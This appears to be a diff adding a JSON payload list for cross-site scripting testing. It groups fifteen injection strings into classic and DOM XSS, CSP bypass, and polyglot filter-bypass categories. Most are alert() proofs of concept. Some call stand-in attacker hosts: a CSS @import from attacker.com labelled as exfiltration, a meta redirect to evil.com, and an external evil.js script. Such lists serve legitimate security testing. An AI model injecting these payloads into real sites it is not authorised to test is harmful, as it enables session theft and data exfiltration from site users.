@@ -1,0 +1,92 @@
+[
+  {
+    "category": "Classic & DOM XSS",
+    "payloads": [
+      {
+        "name": "Basic Script Alert",
+        "description": "Classic <script> tag alert.",
+        "payload": "<script>alert(document.domain)</script>"
+      },
+      {
+        "name": "Image OnError JS",
+        "description": "Image with onerror event handler.",
+        "payload": "<img src=x onerror=alert(document.domain)>"
+      },
+      {
+        "name": "SVG Embedded Script",
+        "description": "SVG with embedded script tag.",
+        "payload": "<svg><script>alert(document.domain)</script></svg>"
+      },
+      {
+        "name": "Iframe JavaScript URI",
+        "description": "Iframe with javascript: URI.",
+        "payload": "<iframe src=javascript:alert(document.domain)></iframe>"
+      },
+      {
+        "name": "Anchor JavaScript URI",
+        "description": "Anchor tag with javascript: URI.",
+        "payload": "<a href=javascript:alert(document.domain)>Click me</a>"
+      },
+      {
+        "name": "Input Autofocus XSS",
+        "description": "Input with autofocus and onfocus XSS.",
+        "payload": "<input autofocus onfocus=alert(document.domain)>"
+      }
+    ]
+  },
+  {
+    "category": "CSP Bypass & Modern Techniques",
+    "payloads": [
+      {
+        "name": "Inline Script with Unsafe Inline",
+        "description": "Works if 'unsafe-inline' is allowed in CSP.",
+        "payload": "<script>alert('inline')</script>"
+      },
+      {
+        "name": "External Script (Blocked by default-src)",
+        "description": "Loads script from external source (should be blocked by default-src 'self').",
+        "payload": "<script src='https://cdn.jsdelivr.net/npm/evil.js'></script>"
+      },
+      {
+        "name": "Base64 Data URI Script",
+        "description": "Script loaded via data URI (bypasses some CSPs).",
+        "payload": "<script src='data:text/javascript;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='></script>"
+      },
+      {
+        "name": "Style Tag JS Execution (CSS Exfil)",
+        "description": "Abuses CSS to exfiltrate data (not always blocked by CSP).",
+        "payload": "<style>@import 'https://attacker.com/exfil.css';</style>"
+      },
+      {
+        "name": "Meta Refresh Redirect",
+        "description": "Meta refresh to attacker site.",
+        "payload": "<meta http-equiv=refresh content='0;url=https://evil.com'>"
+      }
+    ]
+  },
+  {
+    "category": "Polyglot & Filter Bypass",
+    "payloads": [
+      {
+        "name": "Polyglot SVG/Script",
+        "description": "Polyglot payload for SVG/script filter bypass.",
+        "payload": "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>"
+      },
+      {
+        "name": "Malformed Script Tag",
+        "description": "Script tag with malformed attributes.",
+        "payload": "<script/xss>alert(1)</script>"
+      },
+      {
+        "name": "Event Handler in Div",
+        "description": "Div with onpointerover event.",
+        "payload": "<div onpointerover=alert(1)>Hover me</div>"
+      },
+      {
+        "name": "MathML XSS",
+        "description": "MathML with script (browsers with MathML support).",
+        "payload": "<math><mtext></mtext><script>alert(1)</script></math>"
+      }
+    ]
+  }
+] 
